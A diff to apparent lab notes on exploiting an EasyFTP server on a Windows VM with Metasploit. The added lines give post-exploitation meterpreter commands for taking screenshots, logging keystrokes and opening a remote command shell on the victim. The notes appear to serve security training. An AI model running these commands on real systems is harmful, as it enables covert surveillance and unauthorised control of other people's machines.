@@ -47,9 +47,31 @@ msf exploit(easyftp_cwd_fixret) > set TARGET Number_of_target_Windows_Universal 
 msf exploit(easyftp_cwd_fixret) > exploit # enter meterpreter if succeeded
 
 # 2.4 Loot the target
+# 2.4.1 find the usage of meterpreter
 meterpreter > help
+# 2.4.2 get the system information of the victim
 meterpreter > sysinfo
+# 2.4.3 get an image of the target's desktop
+meterpreter > screenshot
+# 2.4.4 key logging
+# Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
+meterpreter > keyscan_start
+# Shows the keystrokes captured so far
+meterpreter > keyscan_dump	
 
+# 2.4.5 Get a Windows Command Prompt on the target
+meterpreter > shell
+# Leaves the Windows Command Prompt
+C:\Users\Administrator :$ exit
+meterpreter > 
+
+# 2.4.6 exit meterpreter
+meterpreter > exit
+msf >
+
+# 2.4.7 exit metasploit
+msf > exit
+~ $
 ```
 
 On Windows server VM, 🪟
